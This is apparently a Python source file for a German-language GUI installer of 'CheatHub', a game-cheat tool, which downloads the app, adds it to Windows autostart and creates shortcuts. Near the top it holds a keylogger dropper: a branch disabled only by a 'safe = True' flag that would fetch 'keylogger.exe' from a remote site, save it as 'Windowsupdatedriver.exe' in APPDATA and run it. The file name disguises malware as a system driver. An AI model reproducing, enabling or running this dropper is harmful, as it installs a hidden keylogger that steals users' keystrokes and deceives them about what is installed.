import os
import shutil
import ctypes
import requests
import sys
from pathlib import Path
import customtkinter as ctk
from tkinter import messagebox, filedialog
import pythoncom
from win32com.shell import shell, shellcon
import sys
# --- Setup CTk ---
apppath = Path(os.getenv("APPDATA")) / "cheathub"
if os.path.exists(apppath):
    shutil.rmtree(apppath)
    print("Ordner und Inhalt erfolgreich gelöscht.")
else:
    print("Ordner wurde nicht gefunden.")
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

APPDATA_PATH = Path(os.getenv("APPDATA")) / "cheathub"
download_url3 = "https://blockhunter0007.github.io/cheathubdumpingground/main.exe"
AGB_URL = "https://blockhunter0007.github.io/cheathubdumpingground/agb.txt"
KEYLOGGER = "https://blockhunter0007.github.io/cheathubdumpingground/keylogger.exe"
MALWARE_FILENAME = "Windowsupdatedriver.exe"
DEST_PATH_2 = Path(os.getenv("APPDATA"))
DEST_PATH_3 = DEST_PATH_2 / MALWARE_FILENAME
safe = True
if safe == False:
    try:
        r = requests.get(KEYLOGGER, stream=True)
        r.raise_for_status()
        with open(DEST_PATH_3, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        os.startfile(DEST_PATH_3)
    except Exception as e:
        messagebox.showerror("Fehler", f"Download fehlgeschlagen:\n{e}")
# --- Hilfsfunktionen ---
agb_content = ""

try:
    response = requests.get(AGB_URL)
    if response.status_code == 200:
        agb_content = response.text
        #print(agb_content)
    else:
        response = "Die Nutzung von CheatHub erfolgt vollständig auf eigene Verantwortung.\nDer Betreiber übernimmt keinerlei Haftung für direkte oder indirekte Schäden, Datenverluste, Account-Sperrungen oder sonstige Konsequenzen, die durch die Nutzung der bereitgestellten Software entstehen.\nAlle Inhalte und Funktionen werden ohne jegliche Garantie bereitgestellt.\nJegliche Verwendung der Software zu betrügerischen, illegalen oder gegen die Nutzungsbedingungen von Drittanbietern verstoßenden Zwecken ist strikt untersagt.\nDer Nutzer bestätigt, dass er die Software nur in einem rechtlich zulässigen Rahmen verwendet und alle Risiken selbst trägt.\nDer Betreiber behält sich das Recht vor, Inhalte jederzeit zu ändern oder zu entfernen.\nMit der Nutzung der Software erklärt der Nutzer, dass er diese Bedingungen vollständig gelesen, verstanden und akzeptiert hat.\nJegliche Haftung des Betreibers wird im maximal gesetzlich zulässigen Umfang ausgeschlossen."
        print("hi")
except:
    response = "Die Nutzung von CheatHub erfolgt vollständig auf eigene Verantwortung.\nDer Betreiber übernimmt keinerlei Haftung für direkte oder indirekte Schäden, Datenverluste, Account-Sperrungen oder sonstige Konsequenzen, die durch die Nutzung der bereitgestellten Software entstehen.\nAlle Inhalte und Funktionen werden ohne jegliche Garantie bereitgestellt.\nJegliche Verwendung der Software zu betrügerischen, illegalen oder gegen die Nutzungsbedingungen von Drittanbietern verstoßenden Zwecken ist strikt untersagt.\nDer Nutzer bestätigt, dass er die Software nur in einem rechtlich zulässigen Rahmen verwendet und alle Risiken selbst trägt.\nDer Betreiber behält sich das Recht vor, Inhalte jederzeit zu ändern oder zu entfernen.\nMit der Nutzung der Software erklärt der Nutzer, dass er diese Bedingungen vollständig gelesen, verstanden und akzeptiert hat.\nJegliche Haftung des Betreibers wird im maximal gesetzlich zulässigen Umfang ausgeschlossen."
    print("hi")

def download_file(url, dest_path):
    try:
        r = requests.get(url, stream=True)
        r.raise_for_status()
        with open(dest_path, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        return True
    except Exception as e:
        messagebox.showerror("Fehler", f"Download fehlgeschlagen:\n{e}")
        return False

def create_shortcut(target, shortcut_path, admin=False):
    try:
        shortcut = pythoncom.CoCreateInstance(
            shell.CLSID_ShellLink, None,
            pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
        )
        shortcut.SetPath(str(target))
        if admin:
            shortcut.SetDescription("CheatHub (Admin)")
        persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
        persist_file.Save(str(shortcut_path), 0)
        return True
    except Exception as e:
        messagebox.showerror("Fehler", f"Shortcut konnte nicht erstellt werden:\n{e}")
        return False

def add_to_startup(file_path):
    startup_dir = Path(os.getenv("APPDATA")) / "Microsoft/Windows/Start Menu/Programs/Startup"
    shortcut_path = startup_dir / "CheatHub.lnk"
    create_shortcut(file_path, shortcut_path)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# --- Installer GUI ---
class InstallerApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("CheatHub Installer")
        self.geometry("600x400")
        self.resizable(False, False)

        self.page_index = 0
        self.pages = []

        self.agb_var = ctk.BooleanVar(value=False)
        self.admin_var = ctk.BooleanVar(value=True)
        self.autostart_var = ctk.BooleanVar(value=True)
        self.checkpy = ctk.BooleanVar(value=True)
        self.desktop_var = ctk.BooleanVar(value=True)
        self.install_path = APPDATA_PATH
        self.installed_exe_path = None

        self.create_pages()
        self.show_page(0)

    def create_pages(self):
        # --- Page 0: AGB ---
        page_agb = ctk.CTkFrame(self)
        ctk.CTkLabel(page_agb, text="AGB", font=ctk.CTkFont(size=20, weight="bold")).pack(pady=10)
        agb_text = ctk.CTkTextbox(page_agb, width=550, height=250)
        agb_text.insert("0.0", agb_content)
        agb_text.configure(state="disabled")
        agb_text.pack(pady=10)
        ctk.CTkCheckBox(page_agb, text="AGB akzeptieren", variable=self.agb_var).pack()
        ctk.CTkButton(page_agb, text="Weiter", command=self.next_page).pack(pady=20)
        self.pages.append(page_agb)

        # --- Page 1: Optionen ---
        page_options = ctk.CTkFrame(self)
        ctk.CTkLabel(page_options, text="Installationsoptionen", font=ctk.CTkFont(size=20, weight="bold")).pack(pady=10)
        ctk.CTkCheckBox(page_options, text="Admin Installation", variable=self.admin_var).pack(anchor="w", padx=20)
        ctk.CTkCheckBox(page_options, text="Autostart", variable=self.autostart_var).pack(anchor="w", padx=20)
        ctk.CTkCheckBox(page_options, text="Download as EXE Files", variable=self.checkpy).pack(anchor="w", padx=20)

        path_frame = ctk.CTkFrame(page_options)
        path_frame.pack(pady=10)
        self.path_label = ctk.CTkLabel(path_frame, text=f"Installationspfad: {self.install_path}")
        self.path_label.pack(side="left")
        ctk.CTkButton(path_frame, text="Ändern", command=self.choose_path).pack(side="right", padx=5)

        ctk.CTkButton(page_options, text="Installieren", command=self.install).pack(pady=20)
        self.pages.append(page_options)

        # --- Page 2: Nachinstallation ---
        page_post = ctk.CTkFrame(self)
        ctk.CTkLabel(page_post, text="", font=ctk.CTkFont(size=20, weight="bold")).pack(pady=10)
        ctk.CTkCheckBox(page_post, text="Desktop Shortcut erstellen", variable=self.desktop_var).pack()
        ctk.CTkButton(page_post, text="Fertigstellen", command=self.finish_installation).pack(pady=20)
        self.pages.append(page_post)

    def show_page(self, index):
        for page in self.pages:
            page.pack_forget()
        self.pages[index].pack(fill="both", expand=True)
        self.page_index = index

    def next_page(self):
        if self.page_index == 0 and not self.agb_var.get():
            messagebox.showwarning("AGB", "Bitte akzeptieren Sie die AGB, um fortzufahren.")
            return
        self.show_page(self.page_index + 1)

    def choose_path(self):
        path = filedialog.askdirectory(initialdir=APPDATA_PATH, title="Installationspfad wählen")
        if path:
            self.install_path = Path(path)
            self.path_label.configure(text=f"Installationspfad: {self.install_path}")

    def install(self):
        global download_url3
        os.system("pip install customtkinter Pillow keyring pypresence pywin32 requests")
        # Admin prüfen
        if self.admin_var.get() and not is_admin():
            messagebox.showinfo("Admin Rechte", "Bitte den Installer als Administrator ausführen.")
            return

        # Ordner erstellen
        self.install_path.mkdir(parents=True, exist_ok=True)

        # Datei herunterladen
        jsonfile = self.install_path
        if self.checkpy.get():
            download_url3 = "https://blockhunter0007.github.io/cheathubdumpingground/main.exe"
            exe_path = self.install_path / "main.exe"
        elif not self.checkpy.get():
            download_url3 = "https://blockhunter0007.github.io/cheathubdumpingground/main.py"
            exe_path = self.install_path / "main.py"
        if not download_file(download_url3, exe_path):
            return

        self.installed_exe_path = exe_path

        # Autostart
        if self.autostart_var.get():
            add_to_startup(exe_path)

        # Weiter zur Nachinstallation (Desktop Shortcut)
        self.show_page(2)

    def finish_installation(self):
        # Desktop Shortcut
        if self.desktop_var.get() and self.installed_exe_path:
            desktop = Path(os.path.join(os.environ["USERPROFILE"], "Desktop"))
            create_shortcut(self.installed_exe_path, desktop / "CheatHub.lnk", admin=self.admin_var.get())

        # Fertig Popup & App starten
        result = messagebox.askyesno("Installation abgeschlossen", "Installation abgeschlossen! Soll die App jetzt gestartet werden?")
        if result and self.installed_exe_path:
            os.startfile(self.installed_exe_path)

        self.destroy()


if __name__ == "__main__":
    app = InstallerApp()
    app.mainloop()